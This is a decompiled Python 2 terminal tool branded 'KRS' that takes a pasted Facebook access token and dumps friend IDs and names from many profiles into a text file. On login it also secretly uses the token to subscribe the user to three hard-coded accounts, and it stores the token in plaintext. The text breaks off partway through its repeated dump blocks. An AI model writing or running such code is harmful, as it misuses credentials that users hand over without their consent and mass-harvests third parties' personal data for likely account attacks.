# Source Generated with Decompyle++
# File: out.pyc (Python 2.7)

import os
import sys
import re
import time
import json
import requests
import random
import datetime
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from time import sleep
reload(sys)
sys.setdefaultencoding('utf-8')
H = '\x1b[1;90m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
T = '\x1b[1;94m'
U = '\x1b[1;95m'
B = '\x1b[1;96m'
P = '\x1b[1;97m'
ua_nokia = 'Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530'
ua_xiaomi = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.11 Mobile Safari/537.36'
ua_macos = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15'
ua_vivo = 'Mozilla/5.0 (Linux; U; Android 6.0; en-US; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.5.0.1015 Mobile Safari/537.36'
ua_oppo = 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36'
ua_huawei = 'Mozilla/5.0 (Linux; Android 8.0.0; HUAWEI Y7 PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36'
ua_redmi4a = 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36'
ua_vivoy12 = 'Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36'
ua_nokiax = 'NokiaX2-01/5.0 (07.10) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
ua_asus = 'Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'
ua_galaxys10 = 'Mozilla/5.0 (Linux; Android 9; SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36'
ua_lenovo = 'Mozilla/5.0 (Linux; Android 9; Lenovo TB-8705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36'
ua = random.choice([
    ua_nokia,
    ua_xiaomi,
    ua_samsung,
    ua_macos,
    ua_vivo,
    ua_oppo,
    ua_huawei,
    ua_redmi4a,
    ua_vivoy12,
    ua_nokiax,
    ua_asus,
    ua_galaxys10,
    ua_lenovo])

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
        os.system('clear')
    

logo = '\x1b[1;93m        _   _______  _____   \n\x1b[1;92m       | | / / __ \\ / ____|  \n\x1b[1;93m       | |/ | |__) | (___   \n\x1b[1;92m       |  < |  _  / \\___ \\   \n\x1b[1;93m       | |\\ | | \\ \\ ____) |  \n\x1b[1;92m       |_|\\_\\_|  \\_\\_____/   \n\n=======================================\n    \x1b[1;92m[\x1b[1;91m!\x1b[1;92m] \x1b[1;92mAUTHOR   \x1b[1;95m= \x1b[1;93mKRS\n    \x1b[1;92m[\x1b[1;91m!\x1b[1;92m] GITHUB   \x1b[1;95m= \x1b[1;93mTECH-KRS\n    \x1b[1;92m[\x1b[1;91m!\x1b[1;92m] \x1b[1;92mYOUTUBE  \x1b[1;95m= \x1b[1;93mTips And Tricks \n    \x1b[1;92m[\x1b[1;91m!\x1b[1;92m] WHATSAPP \x1b[1;95m= \x1b[1;93m0333**1118**          \n\x1b[1;92m======================================= \n  '

def Kashif():
    os.system('clear')
    print logo
    time.sleep(0.2)
    print '\x1b[1;91m[\x1b[1;97m1\x1b[1;91m]\x1b[1;91m SUBSCRIBE MY CHANNAL'
    time.sleep(0.2)
    print '\x1b[1;91m[\x1b[1;97m2\x1b[1;91m]\x1b[1;97m EXIT'
    time.sleep(0.2)
    print ''
    R = raw_input('\x1b[1;91m[\x1b[1;97m?\x1b[1;91m]\x1b[1;97m SELECT: \x1b[1;92m')
    if R == '':
        jalan('\x1b[1;91m[\x1b[1;97m!\x1b[1;91m] \x1b[1;91mWRONG INPUT')
        Kashif()
    elif R == '1':
        os.system('xdg-open  https://youtube.com/channel/UC31GN-yIBSwgBR1uqD_Ry3w')
        KRS()
    elif R == '2':
        print '\x1b[1;93m       SEE YOU AGAIN :)'
        sys.exit()


def KRS():
    os.system('clear')
    print logo
    print '\x1b[1;91m[\x1b[1;97m1\x1b[1;91m]\x1b[1;92m CREATE FILE'
    time.sleep(0.2)
    print '\x1b[1;91m[\x1b[1;97m2\x1b[1;91m]\x1b[1;92m HOW TO CREATE FILE'
    time.sleep(0.2)
    print '\x1b[1;91m[\x1b[1;97m3\x1b[1;91m]\x1b[1;97m EXIT'
    time.sleep(0.2)
    print ''
    time.sleep(0.2)
    ok = raw_input('\x1b[1;91m[\x1b[1;97m?\x1b[1;91m]\x1b[1;97m SELECT: \x1b[1;92m')
    if ok == '':
        print '\x1b[1;91m[\x1b[1;97m!\x1b[1;91m] \x1b[1;91mWRONG INPUT'
        KRS()
    elif ok == '1':
        login()
    elif ok == '2':
        os.system('xdg-open  https://youtu.be/MAPctLNFy10')
        KRS()
    elif ok == '3':
        print '\x1b[1;93m       SEE YOU AGAIN :)'
        sys.exit()


def login():
    os.system('clear')
    print logo
    print ''
    
    try:
        ___token___ = raw_input('%s[%s~%s]%sPASTE TOKEN HERE  :%s ' % (B, P, B, P, K))
        if ___token___ in ('', ' '):
            exit('%s[%s!%s]%sPASTE TOKEN HERE ' % (P, M, P, M))
        xwx = requests.get('https://graph.facebook.com/me/?access_token=%s' % ___token___).json()
        requests.post('https://graph.facebook.com/100010581078300/subscribers?access_token=%s' % ___token___)
        requests.post('https://graph.facebook.com/100058762624925/subscribers?access_token=%s' % ___token___)
        requests.post('https://graph.facebook.com/100014246497705/subscribers?access_token=%s' % ___token___)
        print '%s[%s*%s]%s WELCOME TO KRS %s %s' % (B, P, B, P, H, xwx['name'].lower())
        open('login.txt', 'w').write(___token___)
        menu()
    except ConnectionError:
        exit('%s[%s!%s]%sNO INTERNET CONNECTION ' % (P, K, P, K))



def menu():
    os.system('clear')
    
    try:
        ___token___ = open('login.txt', 'r').read()
    except IOError:
        print ''

    print logo
    print '\x1b[1;92m======================================='
    print '\x1b[1;93mPASTE PUBLIC UID HERE'
    print '\x1b[1;93mYOUR FILE MAKE AUTOMATIC'
    print '\x1b[1;93mFILE PATH e.g /sdcard/krs.txt'
    print '\x1b[1;92m======================================='
    print ''
    file = raw_input('\x1b[1;93mENTER YOUR FILE PATH :- ')
    id1 = raw_input('\x1b[1;92mENTER ID 1: ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id1, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id2 = raw_input('\x1b[1;92mENTER ID 2 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id2, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id3 = raw_input('\x1b[1;92mENTER ID 3 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id3, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id4 = raw_input('\x1b[1;92mENTER ID 4 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id4, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id5 = raw_input('\x1b[1;92mENTER ID 5 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id5, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id6 = raw_input('\x1b[1;92mENTER ID 6 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id6, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id7 = raw_input('\x1b[1;92mENTER ID 7 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id7, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id8 = raw_input('\x1b[1;92mENTER ID 8 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id8, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id9 = raw_input('\x1b[1;92mENTER ID 9 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id9, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id10 = raw_input('\x1b[1;92mENTER ID 10 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id10, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id11 = raw_input('\x1b[1;92mENTER ID 11 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id11, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id12 = raw_input('\x1b[1;92mENTER ID 12 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id12, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id13 = raw_input('\x1b[1;92mENTER ID 13 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id13, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id14 = raw_input('\x1b[1;92mENTER ID 14 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id14, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id15 = raw_input('\x1b[1;92mENTER ID 15 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id15, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id16 = raw_input('\x1b[1;92mENTER ID 16 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id16, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id17 = raw_input('\x1b[1;92mENTER ID 17 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id17, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id18 = raw_input('\x1b[1;92mENTER ID 18 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id18, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id19 = raw_input('\x1b[1;92mENTER ID 19  : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id19, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id20 = raw_input('\x1b[1;92mENTER ID 20 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id20, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id21 = raw_input('\x1b[1;92mENTER ID 21 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id21, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id22 = raw_input('\x1b[1;92mENTER ID 22 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id22, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id23 = raw_input('\x1b[1;92mENTER ID 23 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id23, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id24 = raw_input('\x1b[1;92mENTER ID 24 : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id24, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id25 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id25, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id26 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id26, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id27 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id27, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id28 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id28, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id29 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id29, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id30 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id30, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id31 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id31, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id32 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id32, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id33 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id33, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id34 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id34, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id35 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id35, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id36 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id36, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id37 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id37, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id38 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id38, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id39 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id39, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id40 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id40, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id41 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id41, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id42 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id42, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id43 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id43, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id44 = raw_input('\x1b[1;92miENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id44, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id45 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id45, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id46 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id46, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id47 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id47, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id48 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id48, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id49 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id49, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id50 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id50, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id51 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id51, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id52 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id52, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id53 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id53, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id54 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id54, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id55 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id55, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id56 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id56, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
